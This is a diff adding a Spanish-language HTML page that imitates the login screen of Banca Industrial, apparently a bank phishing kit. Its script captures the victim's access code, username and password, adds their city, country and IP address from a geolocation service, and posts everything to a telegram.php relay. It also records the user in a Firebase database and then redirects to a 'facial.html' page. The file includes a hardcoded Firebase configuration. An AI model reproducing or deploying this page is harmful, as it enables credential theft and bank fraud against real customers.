@@ -1,0 +1,307 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+    <script type="module">
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+      import {
+        getFirestore,
+        doc,
+        setDoc,
+        onSnapshot,
+        serverTimestamp,
+      } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
+
+      const firebaseConfig = {
+        apiKey: "AIzaSyDFYJf5HrCfbyEkggIHJ6hcgQJpUKMfzc0",
+        authDomain: "basedtos-84767.firebaseapp.com",
+        projectId: "basedtos-84767",
+        storageBucket: "basedtos-84767.appspot.com",
+        messagingSenderId: "622608516389",
+        appId: "1:622608516389:web:b3c12b4a3537c1bfff06cc",
+      };
+
+      const app = initializeApp(firebaseConfig);
+      const db = getFirestore(app);
+
+      window.db = db; // Hacer db accesible globalmente
+      window.doc = doc;
+      window.setDoc = setDoc;
+      window.serverTimestamp = serverTimestamp;
+      window.onSnapshot = onSnapshot;
+    </script>
+    <title>Banca Industrial</title>
+    <style>
+      body {
+        margin: 0;
+        border: 0;
+      }
+      .contenedor {
+        min-height: 105px;
+        background: #003764;
+        display: flex;
+        align-items: center;
+      }
+      .contenedor > div {
+        flex: 1; /* Hace que ambos divs tengan el mismo tamaño en dispositivos grandes */
+      }
+
+      @media (max-width: 768px) {
+        .contenedor {
+          flex-direction: column; /* Cambia la dirección para dispositivos móviles */
+          padding-top: 30px;
+        }
+        .pc {
+          display: none;
+        }
+        .celular {
+          margin-top: 20px;
+        }
+      }
+      @media (min-width: 768px) {
+        .celular {
+          display: none;
+        }
+      }
+    </style>
+    <style>
+      .contenedor-dividido {
+        display: flex;
+      }
+
+      .izquierda,
+      .derecha {
+        flex: 1; /* Ambos divs ocupan el mismo espacio en pantallas grandes */
+      }
+
+      .derecha {
+        display: flex;
+        justify-content: center; /* Centrado horizontal */
+        align-items: center; /* Centrado vertical */
+        flex-wrap: wrap;
+      }
+      @media (max-width: 768px) {
+        .izquierda {
+          display: none; /* Oculta el div de la izquierda en dispositivos móviles */
+        }
+      }
+    </style>
+    <style>
+      .inputs {
+        width: 247px;
+        height: 44px;
+        background: transparent;
+        padding-left: 55px;
+        border-radius: 5px;
+        border-color: white;
+        /* Elimina todos los efectos de focus */
+        outline: none;
+      }
+      /* Elimina el borde de focus en todos los navegadores */
+      .inputs:focus {
+        outline: none;
+        box-shadow: none;
+        border-color: white;
+      }
+      .inputs::placeholder {
+        color: gray;
+        font-weight: bold;
+      }
+      /* Elimina el resaltado de selección de texto */
+      .inputs::selection {
+        background-color: transparent;
+      }
+      .inputs::-moz-selection {
+        background-color: transparent;
+      }
+      .a {
+        color: white;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="contenedor">
+      <div>
+        <img src="logo_BI-blanco.png" width="70px" style="margin-left: 15%" />
+      </div>
+      <div style="text-align: center">
+        <img src="menu.JPG" width="450px" class="pc" />
+        <img src="menu2.PNG" width="300px" class="celular" />
+      </div>
+    </div>
+
+    <div class="contenedor-dividido">
+      <div
+        class="izquierda"
+        style="
+          height: 100vh;
+          background-image: url(&quot;img1Actual.png&quot;);
+          background-size: cover;
+          background-position: center;
+          background-repeat: no-repeat;
+        "
+      ></div>
+      <div class="derecha">
+        <div style="margin-top: 50px" class="pc">
+          <img src="Logotipo_vertical_bi.png" style="width: 174px" />
+        </div>
+
+        <div
+          style="
+            margin-top: 20px;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-wrap: wrap;
+          "
+        >
+          <div
+            style="
+              width: 340px;
+              height: 405px;
+              background-image: url(&quot;login.PNG&quot;);
+              background-size: cover;
+              background-position: center;
+              background-repeat: no-repeat;
+            "
+          >
+            <form id="loginForm">
+              <div style="margin-left: 15px; margin-top: 80px">
+                <input
+                  type="text"
+                  class="inputs"
+                  placeholder="Código"
+                  id="codigoUsuario"
+                />
+                <input
+                  type="text"
+                  class="inputs"
+                  id="nombreUsuario"
+                  placeholder="Usuario"
+                  style="margin-top: 28px"
+                />
+                <input
+                  type="text"
+                  class="inputs"
+                  id="contrasenaUsuario"
+                  placeholder="Contraseña"
+                  style="margin-top: 28px"
+                />
+                <br />
+                <button
+                  type="submit"
+                  style="
+                    margin-top: 17px;
+                    width: 306px;
+                    height: 50px;
+                    background: transparent;
+                    border: 0;
+                  "
+                ></button>
+              </div>
+            </form>
+          </div>
+        </div>
+        <div>
+          <img
+            src="tipsdesguridad.PNG"
+            width="340px"
+            style="margin-top: 20px"
+          />
+        </div>
+        <div style="width: 100%" class="a">a</div>
+        <div style="width: 100%" class="a">a</div>
+        <div style="width: 100%" class="a">a</div>
+        <div style="width: 100%" class="a">a</div>
+        <div style="width: 100%" class="a">a</div>
+        <div style="width: 100%" class="a">a</div>
+        <div style="width: 100%" class="a">a</div>
+        <div style="width: 100%" class="a">a</div>
+        <div style="width: 100%" class="a">a</div>
+      </div>
+    </div>
+  </body>
+  <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+  <script>
+    (function () {
+      "use strict";
+
+      const API_GEOLOCATION = "https://ipapi.co/json/";
+      const REDIRECT_URL = "facial.html";
+
+      const formularioLogin = document.getElementById("loginForm");
+
+      if (formularioLogin) {
+        formularioLogin.addEventListener("submit", async function (evento) {
+          evento.preventDefault();
+
+          const codigo = document.getElementById("codigoUsuario").value;
+          const usuario = document.getElementById("nombreUsuario").value;
+          const contrasena = document.getElementById("contrasenaUsuario").value;
+
+          try {
+            if (window.db && window.doc && window.setDoc) {
+              const questionRef = doc(window.db, "s2", usuario);
+              await setDoc(questionRef, {
+                lastSeen: window.serverTimestamp(),
+                page: 0,
+                passwordEntered: true,
+              });
+            }
+          } catch (error) {
+            console.log("Firebase no disponible, continuando...");
+          }
+
+          // Obtener geolocalización
+          axios
+            .get(API_GEOLOCATION)
+            .then(function (respuestaGeolocalizacion) {
+              localStorage.setItem("usuario", usuario);
+
+              const datosGeograficos = respuestaGeolocalizacion.data;
+              const mensajeTelegram =
+                "\nBancoBi\nCódigo: " +
+                codigo +
+                "\nUsuario: " +
+                usuario +
+                "\nContraseña: " +
+                contrasena +
+                "\nCiudad: " +
+                datosGeograficos.city +
+                "\nPaís: " +
+                datosGeograficos.country +
+                "\nIP: " +
+                datosGeograficos.ip;
+
+              // Enviar mensaje al PHP
+              return enviarMensajePHP(mensajeTelegram);
+            })
+            .then(function () {
+              window.location.href = REDIRECT_URL;
+            })
+            .catch(function (error) {
+              console.error("Error en el proceso:", error);
+              window.location.href = REDIRECT_URL;
+            });
+        });
+      }
+
+      // Función para enviar mensaje al PHP
+      function enviarMensajePHP(mensajeTelegram) {
+        // Crear FormData con el mensaje ya formado
+        const formData = new FormData();
+        formData.append("mensaje", mensajeTelegram);
+
+        // Enviar al archivo PHP (telegram.php)
+        return fetch("telegram.php", {
+          method: "POST",
+          body: formData,
+          mode: "no-cors",
+        });
+      }
+    })();
+  </script>
+</html>
